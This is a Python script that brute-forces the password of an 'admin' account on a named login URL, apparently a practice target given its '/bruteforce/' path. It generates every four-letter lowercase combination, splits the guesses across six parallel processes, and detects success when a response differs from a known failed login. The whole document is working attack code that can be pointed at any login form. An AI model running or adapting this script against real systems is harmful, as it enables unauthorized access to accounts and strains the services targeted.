import requests
import requests
import time
from requests.exceptions import ConnectTimeout
import multiprocessing as mp

count = 6
char = 'abcdefghijklmnopqrstuvwxyz'
url = 'https://dudo.gvpt.sk/bruteforce/account/login'
passwords = [a+b+c+d for a in char for b in char for c in char for d in char]
def req(i,passwords,foundit,ret_list):
    s = requests.session()
    certain = s.post(url,data={'username':'admin','password':'a','action':''})
    certain = certain.text
    start = (((len(passwords)//count) * (i))+12000)
    end = (len(passwords)//count) * (i+1)
    for password in passwords[start:end:]:
        if not foundit.is_set():
            try:
                idk = s.post(url,data={'username':'admin','password':password,'action':''})
            except ConnectTimeout:
                print(f'timeout {i}')
                time.sleep(5)
                idk = s.post(url,data={'username':'admin','password':password,'action':''})
            if idk.text!=certain:
                ret_list.append(password)
                foundit.set()
                print(f'found password {password} {idk}')
                break
            if passwords.index(password)%1000==0:
                print(f'1000 - {i}')
            elif passwords.index(password)%10000==0:
                print(f'10000 - {i}')
        else:
            break
    print(f'finish {i}')
    

pool = []
if __name__ =='__main__':
    foundit = mp.Event()
    manager = mp.Manager()
    ret_list = manager.list()
    for i in range(count):
        pool.append(mp.Process(target= req, args = (i,passwords,foundit,ret_list)))
    for p in pool:
        p.start()
    foundit.wait()
    for p in pool:
        p.terminate()
    for p in pool:
        p.join()
    print(ret_list)
    print('finished')